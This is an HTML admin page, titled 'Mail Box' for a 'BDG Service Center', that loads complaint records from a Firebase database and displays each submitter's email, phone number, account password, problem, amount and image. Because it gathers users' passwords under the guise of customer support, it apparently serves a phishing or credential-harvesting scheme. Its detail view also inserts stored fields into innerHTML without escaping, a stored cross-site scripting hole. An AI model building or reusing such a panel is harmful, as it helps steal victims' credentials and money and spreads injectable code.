<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail Box - BDG Service Center</title>
    <link rel="icon" href="../../IMAGE/faviconV2.png" type="image/png">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">

        <main class="main">

            <a href="index.html" class="back-circle" title="Back">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
            </a>

            <h1 class="heading">MAIL BOX</h1>

            <div id="mailList" class="mailbox-list">
                <p class="complaint-loading">Loading complaints...</p>
            </div>

        </main>

    </div>

    <div id="detailModal" class="detail-modal hidden">
        <div class="detail-box">
            <button id="detailClose" class="detail-close" title="Close">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
            </button>
            <div id="detailBody"></div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var config = {
                apiKey: "AIzaSyCiuhqX-mjBB6eRjljirzIyuJv0wKVRj58",
                authDomain: "ludojoy-ca35c.firebaseapp.com",
                databaseURL: "https://ludojoy-ca35c-default-rtdb.asia-southeast1.firebasedatabase.app",
                projectId: "ludojoy-ca35c",
                storageBucket: "ludojoy-ca35c.firebasestorage.app",
                messagingSenderId: "591882703572",
                appId: "1:591882703572:web:862fa9a649e4723c3b6141"
            };
            var db = firebase.initializeApp(config).database();
            var list = document.getElementById('mailList');
            var modal = document.getElementById('detailModal');
            var detailBody = document.getElementById('detailBody');
            var complaints = [];

            document.getElementById('detailClose').addEventListener('click', closeDetail);
            modal.addEventListener('click', function (e) {
                if (e.target === modal) { closeDetail(); }
            });

            function closeDetail() {
                modal.classList.add('closing');
                setTimeout(function () {
                    modal.classList.add('hidden');
                    modal.classList.remove('closing');
                }, 200);
            }

            db.ref('bdg-chat/complaints').orderByChild('time').on('value', function (snap) {
                complaints = [];
                snap.forEach(function (child) {
                    var c = child.val();
                    c.key = child.key;
                    complaints.push(c);
                });
                complaints.reverse();
                if (!complaints.length) {
                    list.innerHTML = '<p class="empty-msg">No complaints yet.</p>';
                    return;
                }
                list.innerHTML = '';
                complaints.forEach(function (c) {
                    list.appendChild(complaintCard(c));
                });
            });

            function complaintCard(c) {
                var card = document.createElement('div');
                card.className = 'complaint-card tappable';

                var head = document.createElement('div');
                head.className = 'complaint-head';

                var type = document.createElement('span');
                type.className = 'complaint-type';
                type.textContent = (c.type || 'Complain') + ' Complain';

                var time = document.createElement('span');
                time.className = 'complaint-time';
                time.textContent = c.time || '';

                head.appendChild(type);
                head.appendChild(time);
                card.appendChild(head);

                var rows = [
                    ['E-mail', c.email],
                    ['Phone No', c.phone],
                    ['Password', c.password],
                    ['Problem', c.problem],
                    ['Amount', c.amount]
                ];
                rows.forEach(function (r) {
                    if (!r[1]) { return; }
                    var row = document.createElement('div');
                    row.className = 'complaint-row';
                    var b = document.createElement('b');
                    b.textContent = r[0] + ':';
                    var span = document.createElement('span');
                    span.textContent = r[1];
                    row.appendChild(b);
                    row.appendChild(span);
                    card.appendChild(row);
                });

                var hint = document.createElement('p');
                hint.className = 'complaint-hint';
                hint.textContent = 'Tap to see full details';
                card.appendChild(hint);

                card.addEventListener('click', function () { openDetail(c); });
                return card;
            }

            function openDetail(c) {
                var num = '#' + (c.key ? c.key.slice(-6).toUpperCase() : '000000');
                var html = '<div class="detail-head"><span class="complaint-type">' + (c.type || 'Complain') + ' Complain</span><span class="complaint-no">' + num + '</span></div>';

                var rows = [
                    ['E-mail', c.email],
                    ['Phone No', c.phone],
                    ['Password', c.password],
                    ['Problem', c.problem],
                    ['Amount', c.amount],
                    ['Time', c.time]
                ];
                rows.forEach(function (r) {
                    if (!r[1]) { return; }
                    html += '<div class="complaint-row"><b>' + r[0] + ':</b><span>' + r[1] + '</span></div>';
                });

                if (c.image) {
                    html += '<img class="complaint-img" src="' + c.image + '" alt="Complaint Image">';
                }

                detailBody.innerHTML = html;
                modal.classList.remove('hidden');
            }
        });
    </script>
</body>
</html>
